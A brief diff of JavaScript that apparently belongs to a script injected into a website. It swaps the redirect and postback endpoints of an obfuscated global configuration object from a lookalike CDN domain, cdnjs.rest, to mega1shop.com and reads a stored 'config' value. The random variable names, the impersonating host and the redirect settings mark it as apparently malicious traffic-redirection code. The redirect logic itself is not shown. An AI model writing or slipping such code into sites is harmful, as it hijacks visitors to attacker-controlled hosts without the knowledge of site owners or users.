@@ -4,8 +4,8 @@
         window._fckLxKmpPqrGc9GY = {
             unique: false,
             ttl: 86400,
-            R_PATH: 'https://cdnjs.rest/yf7t4h',
-            P_PATH: 'https://cdnjs.rest/19d4412/postback',
+            R_PATH: 'https://mega1shop.com/NW7XkGZX',
+            P_PATH: 'https://mega1shop.com/19d4412/postback',
         };
     }
     const _ZBk1FHH2KMyv1dgh = localStorage.getItem('config');
